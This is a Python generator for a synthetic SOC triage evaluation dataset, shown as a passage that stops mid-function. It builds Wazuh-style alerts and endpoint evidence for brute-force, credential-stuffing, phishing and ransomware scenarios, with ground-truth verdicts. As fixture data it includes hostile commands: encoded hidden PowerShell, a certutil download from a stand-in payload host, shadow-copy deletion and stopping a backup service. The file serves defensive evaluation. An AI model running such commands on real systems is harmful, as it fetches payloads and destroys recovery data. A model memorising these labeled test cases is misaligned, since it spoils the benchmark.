"""Deterministic generation of the 50-case labeled evaluation dataset.

Each case is an *incident bundle*: one to eight Wazuh-shaped alert documents
plus the identity and endpoint evidence a triage agent would retrieve while
investigating them.

Ground truth is assigned by this module from the scenario that built the case.
The label is never inferred from prose and never produced by a model. That is
the whole point of the dataset: a model can be scored against a label that it
had no hand in creating.

The generator is seeded, so the same ``dataset_id``/``seed`` pair always
produces byte-identical JSONL.
"""

from __future__ import annotations

import random
from collections import Counter
from datetime import datetime, timedelta, timezone
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple

from evals.models import (
    EDREvidence,
    EvalCase,
    IdentityEvidence,
    SIEMEvidence,
)
from evals.taxonomy import (
    ACTIONS,
    BENIGN_SCENARIOS,
    DIFFICULTIES,
    FORBIDDEN_PROSE_TERMS,
    LABEL_PREFIX,
    LABELS,
    MITRE_BY_LABEL,
    MITRE_NAMES,
    MITRE_TACTICS,
    SEVERITIES,
    VERDICTS,
)
from schemas.wazuh import WazuhAgent, WazuhAlert, WazuhRule, WazuhRuleMitre

UTC = timezone.utc
DEFAULT_DATASET_ID = "soc-eval-2026-11"
DEFAULT_SEED = 20261104
CASES_PER_LABEL = 10
BASE_TIME = datetime(2026, 10, 1, 8, 0, 0, tzinfo=UTC)

SUCCESS_RULE_IDS = {"5715", "40112", "100030", "67022"}

AGENTS: Dict[str, Dict[str, str]] = {
    "kali": {"id": "002", "name": "Kali", "ip": "192.168.64.3"},
    "ubuntu": {"id": "008", "name": "ubuntu", "ip": "192.168.64.2"},
    "windows": {"id": "007", "name": "DESKTOP-VCKJCPV", "ip": "10.11.1.232"},
}

USERNAMES = [
    "aokonkwo", "marcus.chen", "priya.patel", "tom.novak", "grace.rossi",
    "dmitri.kim", "elena.silva", "james.brown", "chloe.nguyen", "ravi.khan",
    "nadia.oconnor", "olivia.weber", "kofi.doe", "liam.sato", "mia.hansen",
    "noah.mensah", "labtester",
]
FIRST_NAMES = {
    "aokonkwo": "Aisha Okonkwo", "marcus.chen": "Marcus Chen",
    "priya.patel": "Priya Patel", "tom.novak": "Tom Novak",
    "grace.rossi": "Grace Rossi", "dmitri.kim": "Dmitri Kim",
    "elena.silva": "Elena Silva", "james.brown": "James Brown",
    "chloe.nguyen": "Chloe Nguyen", "ravi.khan": "Ravi Khan",
    "nadia.oconnor": "Nadia O'Connor", "olivia.weber": "Olivia Weber",
    "kofi.doe": "Kofi Doe", "liam.sato": "Liam Sato",
    "mia.hansen": "Mia Hansen", "noah.mensah": "Noah Mensah",
    "labtester": "Lab Tester",
}
DEPARTMENTS = ["Engineering", "Sales", "Finance", "HR", "Marketing", "Legal"]
CITIES: Dict[str, Tuple[str, str]] = {
    "London": ("GB", "10.11.20.11"),
    "Paris": ("FR", "10.11.21.12"),
    "Berlin": ("DE", "10.11.22.13"),
    "Dublin": ("IE", "10.11.23.14"),
    "New York": ("US", "10.11.24.15"),
    "Austin": ("US", "10.11.25.16"),
    "Toronto": ("CA", "10.11.26.17"),
    "Sydney": ("AU", "10.11.27.18"),
    "Singapore": ("SG", "10.11.28.19"),
    "Amsterdam": ("NL", "10.11.29.20"),
}
ATTACK_GEOS = [
    ("Moscow", "RU"), ("Sao Paulo", "BR"), ("Frankfurt", "DE"),
    ("Beijing", "CN"), ("Kyiv", "UA"), ("Bangkok", "TH"),
]


# ---------------------------------------------------------------------------
# low-level builders
# ---------------------------------------------------------------------------

def _iso(value: datetime) -> str:
    return value.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _at(case_time: datetime, minutes: float = 0, seconds: float = 0) -> datetime:
    return case_time + timedelta(minutes=minutes, seconds=seconds)


def _mitre(ids: Sequence[str]) -> Optional[WazuhRuleMitre]:
    ids = [i for i in ids if i]
    if not ids:
        return None
    return WazuhRuleMitre(
        id=list(ids),
        tactic=[MITRE_TACTICS.get(i, "") for i in ids],
        technique=[MITRE_NAMES.get(i, i) for i in ids],
    )


def _rule(
    rule_id: str,
    level: int,
    description: str,
    groups: Sequence[str],
    mitre_ids: Sequence[str] = (),
) -> WazuhRule:
    return WazuhRule(
        id=str(rule_id),
        level=int(level),
        description=description,
        groups=list(groups),
        mitre=_mitre(mitre_ids),
    )


def _alert(
    ts: datetime,
    agent: Dict[str, str],
    rule: WazuhRule,
    *,
    data: Optional[Dict[str, Any]] = None,
    full_log: Optional[str] = None,
    location: str = "",
    firedtimes: Optional[int] = None,
) -> WazuhAlert:
    if firedtimes is not None:
        rule = rule.model_copy(update={"firedtimes": int(firedtimes)})
    return WazuhAlert(
        id="pending",
        timestamp=_iso(ts),
        rule=rule,
        agent=WazuhAgent(**agent),
        data=data or {},
        full_log=full_log,
        location=location,
    )


def _profile(
    user_id: int,
    username: str,
    *,
    role: str = "analyst",
    department: str = "Engineering",
    privilege_level: int = 2,
    mfa_enabled: bool = True,
    city: str = "London",
    ip: Optional[str] = None,
    scenario: str = "normal",
) -> Dict[str, Any]:
    country, default_ip = CITIES.get(city, CITIES["London"])
    return {
        "user_id": user_id,
        "username": username,
        "email": f"{username}@meridian-security.example",
        "full_name": FIRST_NAMES.get(username, username),
        "department": department,
        "role": role,
        "privilege_level": privilege_level,
        "mfa_enabled": mfa_enabled,
        "default_country": country,
        "office_city": city,
        "last_known_ip": ip or default_ip,
        "scenario": scenario,
    }


def _login(
    event_id: int,
    user_id: int,
    ts: datetime,
    ip: str,
    *,
    country: str = "GB",
    city: str = "London",
    success: bool = False,
    auth_method: str = "password",
    user_agent: str = "Chrome/120",
    is_admin_action: bool = False,
) -> Dict[str, Any]:
    return {
        "event_id": event_id,
        "user_id": user_id,
        "ts": _iso(ts),
        "ip": ip,
        "country": country,
        "city": city,
        "success": bool(success),
        "auth_method": auth_method,
        "user_agent": user_agent,
        "is_admin_action": bool(is_admin_action),
    }


def _risk(name: str, level: str, detail: str) -> Dict[str, Any]:
    return {"name": name, "level": level, "detail": detail}


def _endpoint(
    endpoint_id: str,
    hostname: str,
    os_name: str,
    ip: str,
    tags: Sequence[str],
    scenario: str,
) -> Dict[str, Any]:
    return {
        "endpoint_id": endpoint_id,
        "hostname": hostname,
        "os": os_name,
        "ip": ip,
        "tags": list(tags),
        "scenario": scenario,
    }


def _process(
    event_id: int,
    endpoint_id: str,
    ts: datetime,
    name: str,
    cmdline: str,
    *,
    user: str = "root",
    pid: int = 1000,
    parent_name: str = "systemd",
    suspicious: bool = False,
    indicator: str = "",
    integrity: str = "medium",
) -> Dict[str, Any]:
    return {
        "event_id": event_id,
        "endpoint_id": endpoint_id,
        "ts": _iso(ts),
        "pid": int(pid),
        "ppid": 1,
        "parent_name": parent_name,
        "name": name,
        "cmdline": cmdline,
        "user": user,
        "integrity": integrity,
        "suspicious": bool(suspicious),
        "indicator": indicator,
    }


def _network(
    event_id: int,
    endpoint_id: str,
    ts: datetime,
    src_ip: str,
    dst_ip: str,
    dst_port: int,
    *,
    direction: str = "outbound",
) -> Dict[str, Any]:
    return {
        "event_id": event_id,
        "endpoint_id": endpoint_id,
        "ts": _iso(ts),
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "dst_port": int(dst_port),
        "direction": direction,
        "proto": "tcp",
    }


def _file(
    event_id: int,
    endpoint_id: str,
    ts: datetime,
    path: str,
    action: str,
    hash_value: Optional[str] = None,
) -> Dict[str, Any]:
    return {
        "event_id": event_id,
        "endpoint_id": endpoint_id,
        "ts": _iso(ts),
        "path": path,
        "action": action,
        "hash": hash_value,
    }


def _identity(profiles, logins, risks=None) -> IdentityEvidence:
    return IdentityEvidence(
        profiles=profiles,
        login_events=logins,
        risk_factors=risks or [],
    )


def _edr(endpoints, processes=None, networks=None, files=None) -> EDREvidence:
    return EDREvidence(
        endpoints=endpoints,
        process_events=processes or [],
        network_events=networks or [],
        file_events=files or [],
    )


def _difficulty(number: int, *, hard: bool = False) -> str:
    if hard:
        return "hard"
    return ("easy", "medium", "hard")[number % 3]


def _parts(
    *,
    scenario: str,
    title: str,
    summary: str,
    severity: str,
    verdict: str,
    action: str,
    alerts: List[WazuhAlert],
    identity: IdentityEvidence,
    edr: EDREvidence,
    difficulty: str,
    mitre: Sequence[str] = (),
    notes: str = "",
) -> Dict[str, Any]:
    return {
        "scenario": scenario,
        "title": title,
        "summary": summary,
        "severity": severity,
        "verdict": verdict,
        "action": action,
        "alerts": alerts,
        "identity": identity,
        "edr": edr,
        "difficulty": difficulty,
        "mitre": list(mitre),
        "notes": notes,
    }


# ---------------------------------------------------------------------------
# scenario builders: malicious labels
# ---------------------------------------------------------------------------

def _brute_force(number: int, rng: random.Random, case_time: datetime) -> Dict[str, Any]:
    agent_key = "kali" if number % 2 == 0 else "ubuntu"
    agent = AGENTS[agent_key]
    username = rng.choice([u for u in USERNAMES if u != "labtester"])
    total_failures = [12, 20, 28, 35, 18, 42, 24, 16, 31, 55][number]
    succeeds = number in (2, 5, 9)
    self_generated = number == 7
    src_ip = agent["ip"] if self_generated else f"203.0.113.{20 + number}"
    start = _at(case_time, minutes=rng.randint(0, 25))

    alerts: List[WazuhAlert] = []
    checkpoints = sorted({
        max(1, total_failures // 4),
        max(2, total_failures // 2),
        max(3, (total_failures * 3) // 4),
        total_failures,
    })
    for i, counter in enumerate(checkpoints):
        ts = start + timedelta(seconds=int(i * (8 + number % 5)))
        alerts.append(_alert(
            ts, agent,
            _rule("5760", 5, "sshd: Failed password for a valid user",
                  ["syslog", "sshd", "authentication_failed", "mitre_attack"],
                  ["T1110.001"]),
            data={"srcip": src_ip, "dstuser": username, "srcport": 40000 + i},
            full_log=(
                f"Failed password for {username} from {src_ip} port "
                f"{40000 + i} ssh2"
            ),
            location=f"/var/log/auth.log",
            firedtimes=counter,
        ))

    mid = start + timedelta(seconds=total_failures // 3)
    alerts.append(_alert(
        mid, agent,
        _rule("5758", 8, "sshd: Maximum authentication attempts exceeded",
              ["syslog", "sshd", "authentication_failed"], ["T1110.001"]),
        data={"srcip": src_ip, "dstuser": username},
        full_log=f"error: maximum authentication attempts exceeded for {username} from {src_ip}",
        location="/var/log/auth.log",
        firedtimes=max(1, total_failures // 3),
    ))

    if succeeds:
        success_ts = start + timedelta(seconds=total_failures * 2)
        alerts.append(_alert(
            success_ts, agent,
            _rule("40112", 12, "Multiple authentication failures followed by a success",
                  ["authentication_success", "attack", "mitre_attack"],
                  ["T1110", "T1078"]),
            data={"srcip": src_ip, "dstuser": username},
            full_log=(
                f"Accepted password for {username} from {src_ip} port "
                f"{49024 + number} ssh2"
            ),
            location="/var/log/auth.log",
            firedtimes=1,
        ))
        alerts.append(_alert(
            success_ts + timedelta(milliseconds=71), agent,
            _rule("5501", 3, "PAM: Login session opened",
                  ["pam", "syslog", "authentication_success"]),
            data={"srcip": src_ip, "dstuser": username},
            full_log=f"pam_unix(sshd:session): session opened for user {username}",
            location="/var/log/auth.log",
        ))
        severity, action, difficult = "critical", "contain", "hard"
        mitre = ["T1110.001", "T1078"]
    else:
        verdict_rule = (
            _rule("100002", 12, "SSH authentication failure burst on one account",
                  ["sshd", "attack", "authentication_failed"], ["T1110.001"])
            if number in (3, 6, 8)
            else _rule("5763", 10, "sshd: Multiple authentication failures from one source",
                       ["syslog", "sshd", "authentication_failed", "mitre_attack"],
                       ["T1110.001"])
        )
        alerts.append(_alert(
            start + timedelta(seconds=total_failures), agent,
            verdict_rule,
            data={"srcip": src_ip, "dstuser": username},
            full_log=f"Failed password for {username} from {src_ip} (aggregated)",
            location="/var/log/auth.log",
            firedtimes=total_failures,
        ))
        severity, action, difficult = "high", "escalate", _difficulty(number)
        mitre = ["T1110.001"]

    profiles = [_profile(
        1, username, role="engineer", department="Engineering",
        privilege_level=3, mfa_enabled=False, city="London",
    )]
    logins = [
        _login(1, 1, start, src_ip, city="Moscow", country="RU", success=False,
               auth_method="password", user_agent="libssh/0.10"),
        _login(2, 1, start + timedelta(seconds=total_failures // 2), src_ip,
               city="Moscow", country="RU", success=False,
               auth_method="password", user_agent="libssh/0.10"),
    ]
    if succeeds:
        logins.append(_login(3, 1, start + timedelta(seconds=total_failures * 2), src_ip,
                             city="Moscow", country="RU", success=True,
                             auth_method="password", user_agent="libssh/0.10"))
    risks = [_risk("repeated_failures", "high",
                   f"{total_failures} failed SSH authentications from {src_ip}")]

    endpoint_id = "ep-002" if agent_key == "kali" else "ep-001"
    hostname = "kali-lab-02" if agent_key == "kali" else "ubuntu-lab-01"
    edr = _edr(
        [_endpoint(endpoint_id, hostname, "linux", agent["ip"],
                   [agent_key, "wazuh-agent"], "brute-force")],
        processes=[_process(
            1, endpoint_id, start, "sshd", "/usr/sbin/sshd -D", user="root",
            suspicious=False, indicator="repeated_ssh_handshake",
        )],
        networks=[
            _network(i + 1, endpoint_id, start + timedelta(seconds=i * 5),
                     src_ip, agent["ip"], 22, direction="inbound")
            for i in range(min(3, total_failures))
        ],
    )

    source_note = " The source address equals the monitored host, so the attempts originated on the endpoint itself." if self_generated else ""
    return _parts(
        scenario="repeated_single_account_failures",
        title="Repeated SSH authentication failures against a single account",
        summary=(
            f"{total_failures} failed SSH authentications for {username} from {src_ip} "
            f"were observed on {agent['name']}."
            + (" A successful authentication followed the failures."
               if succeeds else "")
            + source_note
        ),
        severity=severity,
        verdict="true_positive",
        action=action,
        alerts=alerts,
        identity=_identity(profiles, logins, risks),
        edr=edr,
        difficulty=difficult,
        mitre=mitre,
        notes=f"variant={number}; total_failures={total_failures}; success={succeeds}; "
              f"self_generated_source={self_generated}",
    )


def _credential_stuffing(number: int, rng: random.Random, case_time: datetime) -> Dict[str, Any]:
    agent = AGENTS["kali"] if number % 2 == 0 else AGENTS["ubuntu"]
    users = rng.sample([u for u in USERNAMES if u != "labtester"], 6 + number % 3)
    sources = [f"198.51.100.{30 + i}" for i in range(4 + number % 4)]
    succeeds = number in (4, 8)
    start = _at(case_time, minutes=rng.randint(0, 30))
    attempts_per_user = 2 + number % 3
    total_attempts = len(users) * attempts_per_user

    alerts: List[WazuhAlert] = []
    for i, src in enumerate(sources[:3]):
        user = users[i % len(users)]
        alerts.append(_alert(
            start + timedelta(seconds=i * 35), agent,
            _rule("5710", 5, "sshd: Attempt to login using a non-existent user",
                  ["syslog", "sshd", "authentication_failed", "invalid_login"],
                  ["T1110.004"]),
            data={"srcip": src, "dstuser": user},
            full_log=f"Invalid user {user} from {src} port {51000 + i}",
            location="/var/log/auth.log",
            firedtimes=attempts_per_user,
        ))
    for i, src in enumerate(sources[:2]):
        alerts.append(_alert(
            start + timedelta(seconds=60 + i * 30), agent,
            _rule("5760", 5, "sshd: Failed password for a valid user",
                  ["syslog", "sshd", "authentication_failed"], ["T1110.004"]),
            data={"srcip": src, "dstuser": users[(i + 3) % len(users)]},
            full_log=f"Failed password for {users[(i + 3) % len(users)]} from {src}",
            location="/var/log/auth.log",
            firedtimes=attempts_per_user,
        ))
    alerts.append(_alert(
        start + timedelta(seconds=150), agent,
        _rule("5712", 10, "sshd: Attempt to login using a non-existent user from one source",
              ["syslog", "sshd", "authentication_failed", "invalid_login"],
              ["T1110.003", "T1110.004"]),
        data={"srcip": sources[0], "dstuser": users[0]},
        full_log=f"Invalid user {users[0]} from {sources[0]} (aggregated)",
        location="/var/log/auth.log",
        firedtimes=6,
    ))
    alerts.append(_alert(
        start + timedelta(seconds=180), agent,
        _rule("100031", 10, "SSH authentication failures across multiple accounts",
              ["sshd", "attack", "authentication_failed"], ["T1110.003", "T1110.004"]),
        data={"srcip": sources[0], "dstuser": users[0]},
        full_log="Multiple account names attempted from distributed sources",
        location="/var/log/auth.log",
        firedtimes=len(users),
    ))

    if succeeds:
        leak_user = users[-1]
        alerts.append(_alert(
            start + timedelta(seconds=240), agent,
            _rule("40112", 12, "Multiple authentication failures followed by a success",
                  ["authentication_success", "attack", "mitre_attack"],
                  ["T1110", "T1078"]),
            data={"srcip": sources[-1], "dstuser": leak_user},
            full_log=f"Accepted password for {leak_user} from {sources[-1]}",
            location="/var/log/auth.log",
        ))

    profiles = [
        _profile(i + 1, username, role=rng.choice(["analyst", "engineer", "manager"]),
                 department=rng.choice(DEPARTMENTS), privilege_level=rng.randint(1, 3),
                 mfa_enabled=bool(rng.random() < 0.5),
                 city=rng.choice(list(CITIES.keys())))
        for i, username in enumerate(users)
    ]
    logins = []
    event_id = 1
    for i, src in enumerate(sources):
        user = users[i % len(users)]
        country = ["RU", "BR", "CN", "TH", "UA"][i % 5]
        city = ["Moscow", "Sao Paulo", "Beijing", "Bangkok", "Kyiv"][i % 5]
        for attempt in range(attempts_per_user):
            logins.append(_login(
                event_id, i % len(users) + 1,
                start + timedelta(seconds=i * 35 + attempt * 4),
                src, country=country, city=city, success=False,
                auth_method="password", user_agent="python-requests/2.31",
            ))
            event_id += 1
    if succeeds:
        logins.append(_login(
            event_id, len(users), start + timedelta(seconds=240), sources[-1],
            country="BR", city="Sao Paulo", success=True,
            auth_method="password", user_agent="python-requests/2.31",
        ))
    risks = [_risk("distributed_failures", "high",
                   f"{total_attempts} failed authentications across {len(users)} accounts "
                   f"from {len(sources)} source addresses")]

    endpoint_id = "ep-002" if agent["id"] == "002" else "ep-001"
    hostname = "kali-lab-02" if agent["id"] == "002" else "ubuntu-lab-01"
    edr = _edr(
        [_endpoint(endpoint_id, hostname, "linux", agent["ip"],
                   ["linux", "wazuh-agent"], "credential-stuffing")],
        processes=[_process(1, endpoint_id, start, "sshd", "/usr/sbin/sshd -D",
                            user="root", suspicious=False)],
        networks=[
            _network(i + 1, endpoint_id, start + timedelta(seconds=i * 20),
                     src, agent["ip"], 22, direction="inbound")
            for i, src in enumerate(sources)
        ],
    )

    return _parts(
        scenario="distributed_multi_account_failures",
        title="Authentication failures across multiple accounts from distributed sources",
        summary=(
            f"{total_attempts} failed SSH authentications across {len(users)} accounts "
            f"from multiple source addresses were observed on {agent['name']}."
            + (" One attempt succeeded." if succeeds else "")
        ),
        severity="critical" if succeeds else "high",
        verdict="true_positive",
        action="contain" if succeeds else "escalate",
        alerts=alerts,
        identity=_identity(profiles, logins, risks),
        edr=edr,
        difficulty=_difficulty(number, hard=succeeds),
        mitre=["T1110.004"] + (["T1078"] if succeeds else []),
        notes=f"variant={number}; accounts={len(users)}; sources={len(sources)}; "
              f"attempts={total_attempts}; success={succeeds}",
    )


def _phishing(number: int, rng: random.Random, case_time: datetime) -> Dict[str, Any]:
    agent = AGENTS["windows"]
    username = rng.choice(["james.brown", "chloe.nguyen", "olivia.weber", "noah.mensah"])
    user_id = 4 + number
    remote_ip = f"198.51.100.{60 + number}"
    payload_ip = f"192.0.2.{40 + number}"
    start = _at(case_time, minutes=rng.randint(0, 40))
    persistence = number in (2, 6, 9)
    endpoint_id = "ep-004"
    hostname = agent["name"]
    endpoint_ip = agent["ip"]

    win_logon = {
        "win": {
            "system": {
                "eventID": "4624",
                "eventSourceName": "Microsoft-Windows-Security-Auditing",
                "channel": "Security",
                "level": "Information",
                "message": "An account was successfully logged on.",
            },
            "eventdata": {
                "targetUserName": username,
                "ipAddress": remote_ip,
                "logonType": "10",
                "authenticationPackageName": "Negotiate",
                "workstationName": "DESKTOP-VCKJCPV",
            },
        },
    }
    alerts: List[WazuhAlert] = [
        _alert(
            start, agent,
            _rule("67022", 3, "Windows: Logon success (event 4624)",
                  ["windows", "windows_security", "authentication_success"]),
            data=win_logon,
            full_log=None,
            location="EventChannel",
        ),
        _alert(
            start + timedelta(seconds=20), agent,
            _rule("67028", 3, "Windows: Special privileges assigned to new logon (event 4672)",
                  ["windows", "windows_security", "privilege_escalation"]),
            data={"win": {"system": {"eventID": "4672", "channel": "Security"},
                          "eventdata": {"targetUserName": username,
                                        "privilegeList": "SeDebugPrivilege, SeImpersonatePrivilege"}}},
            full_log=None,
            location="EventChannel",
        ),
        _alert(
            start + timedelta(minutes=1), agent,
            _rule("550", 7, "File integrity checksum changed",
                  ["syscheck", "windows", "integrity"]),
            data={"file": "C:\\\\Users\\\\Public\\\\invoice.pdf.exe",
                  "event": "modified"},
            full_log="Integrity checksum changed: C:\\Users\\Public\\invoice.pdf.exe",
            location="syscheck",
        ),
        _alert(
            start + timedelta(minutes=2), agent,
            _rule("100040", 12,
                  "Windows: encoded PowerShell spawned by a document reader",
                  ["windows", "sysmon", "powershell", "attack"],
                  ["T1566", "T1204.002", "T1059.001"]),
            data={
                "win": {
                    "eventdata": {
                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
                        "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
                        "parentImage": "C:\\\\Program Files\\\\Adobe\\\\Acrobat\\\\Acrobat.exe",
                        "user": username,
                    },
                },
            },
            full_log=None,
            location="EventChannel",
        ),
    ]
    if persistence:
        alerts.append(_alert(
            start + timedelta(minutes=4), agent,
            _rule("61138", 5, "Windows: New service created (event 7045)",
                  ["windows", "windows_system", "persistence"]),
            data={"win": {"system": {"eventID": "7045", "channel": "System"},
                          "eventdata": {"serviceName": "WindowsUpdateHelper",
                                        "imagePath": "C:\\\\Users\\\\Public\\\\svc.exe"}}},
            full_log=None,
            location="EventChannel",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=5), agent,
            _rule("60110", 8, "Windows: A user account was changed (event 4738)",
                  ["windows", "windows_security", "account_management"]),
            data={"win": {"system": {"eventID": "4738", "channel": "Security"},
                          "eventdata": {"targetUserName": username,
                                        "subjectUserName": "SYSTEM"}}},
            full_log=None,
            location="EventChannel",
        ))

    profiles = [_profile(
        user_id, username, role="manager", department="Finance", privilege_level=3,
        mfa_enabled=bool(number % 2 == 0), city="London",
    )]
    logins = [
        _login(1, user_id, start, remote_ip, country="DE", city="Frankfurt",
               success=True, auth_method="MFA" if number % 2 == 0 else "password",
               user_agent="Windows PowerShell/5.1"),
        _login(2, user_id, start + timedelta(minutes=3), remote_ip,
               country="DE", city="Frankfurt", success=True, auth_method="password",
               user_agent="Windows PowerShell/5.1", is_admin_action=True),
    ]
    risks = [
        _risk("unusual_location", "medium",
              "Successful sign-in from a country not seen in the last 30 days"),
        _risk("unusual_user_agent", "high",
              "Interactive sign-in from a PowerShell user agent"),
    ]
    if persistence:
        risks.append(_risk("new_service", "high",
                           "A service was installed on the endpoint after the sign-in"))

    edr = _edr(
        [_endpoint(endpoint_id, hostname, "windows", endpoint_ip,
                   ["windows", "workstation"], "phishing-compromise")],
        processes=[
            _process(1, endpoint_id, start + timedelta(minutes=2),
                     "Acrobat.exe", "C:\\Program Files\\Adobe\\Acrobat\\Acrobat.exe",
                     user=username, parent_name="explorer.exe", integrity="medium"),
            _process(2, endpoint_id, start + timedelta(minutes=2, seconds=5),
                     "powershell.exe",
                     "powershell.exe -nop -w hidden -enc SQBFAFgA",
                     user=username, parent_name="Acrobat.exe", suspicious=True,
                     indicator="encoded_powershell", integrity="low"),
            _process(3, endpoint_id, start + timedelta(minutes=3),
                     "cmd.exe", "cmd.exe /c certutil -urlcache -f "
                                f"http://{payload_ip}/update.exe",
                     user=username, parent_name="powershell.exe", suspicious=True,
                     indicator="certutil_download", integrity="low"),
        ],
        networks=[
            _network(1, endpoint_id, start + timedelta(minutes=3),
                     endpoint_ip, payload_ip, 80),
            _network(2, endpoint_id, start + timedelta(minutes=4),
                     endpoint_ip, payload_ip, 443),
        ],
        files=[
            _file(1, endpoint_id, start + timedelta(minutes=3, seconds=20),
                  "C:\\Users\\Public\\update.exe", "create", "deadbeefcafe"),
        ],
    )

    return _parts(
        scenario="document_to_powershell_execution",
        title="Unusual document execution and outbound download on an endpoint",
        summary=(
            f"An interactive sign-in by {username} from {remote_ip} was followed by an "
            f"encoded PowerShell process and an outbound download on {hostname}."
            + (" A new service was installed shortly afterwards." if persistence else "")
        ),
        severity="critical" if persistence else "high",
        verdict="true_positive",
        action="contain" if persistence else "escalate",
        alerts=alerts,
        identity=_identity(profiles, logins, risks),
        edr=edr,
        difficulty=_difficulty(number, hard=persistence),
        mitre=["T1566", "T1204.002", "T1059.001"],
        notes=f"variant={number}; persistence={persistence}; endpoint={hostname}",
    )


def _ransomware_precursor(number: int, rng: random.Random, case_time: datetime) -> Dict[str, Any]:
    windows_host = number % 2 == 0
    agent = AGENTS["windows"] if windows_host else AGENTS["ubuntu"]
    username = rng.choice(["dmitri.kim", "elena.silva", "kofi.doe", "nadia.oconnor"])
    start = _at(case_time, minutes=rng.randint(0, 45))
    endpoint_id = "ep-004" if windows_host else "ep-001"
    hostname = agent["name"]
    endpoint_ip = agent["ip"]
    os_name = "windows" if windows_host else "linux"
    shadow_delete = number % 3 != 2
    encryption = number % 3 == 0

    alerts: List[WazuhAlert] = []
    if windows_host:
        alerts.append(_alert(
            start, agent,
            _rule("100045", 13, "Windows: volume shadow copy deletion command observed",
                  ["windows", "sysmon", "attack", "impact"], ["T1490"]),
            data={"win": {"eventdata": {"image": "C:\\\\Windows\\\\System32\\\\vssadmin.exe",
                                        "commandLine": "vssadmin.exe delete shadows /all /quiet",
                                        "user": username}}},
            full_log=None,
            location="EventChannel",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=1), agent,
            _rule("61138", 5, "Windows: New service created (event 7045)",
                  ["windows", "windows_system", "persistence"]),
            data={"win": {"system": {"eventID": "7045", "channel": "System"},
                          "eventdata": {"serviceName": "WinUpdateSvc",
                                        "imagePath": "C:\\\\ProgramData\\\\svc.exe"}}},
            full_log=None,
            location="EventChannel",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=2), agent,
            _rule("67022", 3, "Windows: Logon success (event 4624)",
                  ["windows", "windows_security", "authentication_success"]),
            data={"win": {"system": {"eventID": "4624", "channel": "Security"},
                          "eventdata": {"targetUserName": username,
                                        "ipAddress": "10.11.1.232",
                                        "logonType": "3"}}},
            full_log=None,
            location="EventChannel",
        ))
        if encryption:
            alerts.append(_alert(
                start + timedelta(minutes=4), agent,
                _rule("100046", 14, "Windows: rapid file rewrite with changed extensions",
                      ["windows", "sysmon", "attack", "impact"], ["T1486"]),
                data={"win": {"eventdata": {"user": username,
                                            "fileCount": 240,
                                            "extension": ".encrypted"}}},
                full_log=None,
                location="EventChannel",
            ))
    else:
        alerts.append(_alert(
            start, agent,
            _rule("100046", 14, "Linux: rapid file rewrite with changed extensions",
                  ["linux", "audit", "attack", "impact"], ["T1486"]),
            data={"srcip": "192.0.2.15", "dstuser": username,
                  "fileCount": 240, "extension": ".encrypted"},
            full_log="Bulk rename and rewrite observed under /home/user/Documents",
            location="/var/log/audit/audit.log",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=1), agent,
            _rule("5402", 3, "Successful sudo to ROOT executed",
                  ["sudo", "syslog", "privilege_escalation"]),
            data={"srcip": agent["ip"], "dstuser": "root", "srcuser": username},
            full_log=f"{username} : TTY=pts/0 ; PWD=/home/{username} ; "
                     "COMMAND=/usr/bin/systemctl stop backup",
            location="/var/log/auth.log",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=2), agent,
            _rule("550", 7, "File integrity checksum changed",
                  ["syscheck", "linux", "integrity"]),
            data={"file": "/home/user/Documents/report-01.pdf.encrypted",
                  "event": "created"},
            full_log="Integrity checksum changed: /home/user/Documents/report-01.pdf.encrypted",
            location="syscheck",
        ))
        alerts.append(_alert(
            start + timedelta(minutes=3), agent,
            _rule("510", 7, "Rootcheck: hidden process or file detected",
                  ["rootcheck", "linux"], []),
            data={"file": "/home/user/.cache/.kworker"},
            full_log="Rootcheck found a hidden file: /home/user/.cache/.kworker",
            location="rootcheck",
        ))
    if shadow_delete and windows_host and not encryption:
        alerts.append(_alert(
            start + timedelta(minutes=3), agent,
            _rule("550", 7, "File integrity checksum changed",
                  ["syscheck", "windows", "integrity"]),
            data={"file": "C:\\\\Backup\\\\catalog.db", "event": "modified"},
            full_log="Integrity checksum changed: C:\\Backup\\catalog.db",
            location="syscheck",
        ))

    profiles = [_profile(
        5, username, role="admin", department="IT", privilege_level=5,
        mfa_enabled=False, city="Berlin", scenario="ransomware-precursor",
    )]
    logins = [
        _login(1, 5, start - timedelta(minutes=10), endpoint_ip,
               country="DE", city="Berlin", success=True,
               auth_method="password", user_agent="RDP/10.0", is_admin_action=True),
    ]
    risks = [
        _risk("off_hours_admin", "high",
              "Privileged interactive sign-in outside normal working hours"),
        _risk("backup_target", "high",
              "The endpoint is tagged as a backup server"),
    ]

    processes = [
        _process(1, endpoint_id, start,
                 "vssadmin.exe" if windows_host else "crypto.exe",
                 "vssadmin.exe delete shadows /all /quiet" if windows_host
                 else "crypto.exe --encrypt /home/user/Documents",
                 user=username, parent_name="cmd.exe" if windows_host else "bash",
                 suspicious=True,
                 indicator="vssadmin_shadow_delete" if windows_host else "bulk_encryption",
                 integrity="low"),
        _process(2, endpoint_id, start + timedelta(minutes=1),
                 "schtasks.exe" if windows_host else "systemctl",
                 "schtasks.exe /create /tn updater /sc hourly" if windows_host
                 else "systemctl stop backup",
                 user=username, parent_name="cmd.exe" if windows_host else "sudo",
                 suspicious=True, indicator="persistence", integrity="low"),
    ]
    files = [
        _file(i + 1, endpoint_id, start + timedelta(minutes=4, seconds=i * 2),
              f"C:\\Backup\\report-{i}.pdf.encrypted" if windows_host
              else f"/home/user/Documents/report-{i}.pdf.encrypted",
              "create", f"a1b2c3d4e5f6{i:04x}")
        for i in range(4)
    ]
    edr = _edr(
        [_endpoint(endpoint_id, hostname, os_name, endpoint_ip,
                   ["backup"] if not windows_host else ["windows", "server"],
                   "ransomware-precursor")],
        processes=processes,
        networks=[
            _network(1, endpoint_id, start + timedelta(minutes=2),
                     endpoint_ip, "192.0.2.15", 443),
            _network(2, endpoint_id, start + timedelta(minutes=3),
                     endpoint_ip, "198.51.100.200", 443),
        ],
        files=files,
    )

    return _parts(
        scenario="shadow_delete_and_bulk_rewrite",
        title="Shadow copy deletion followed by bulk file modification",
        summary=(
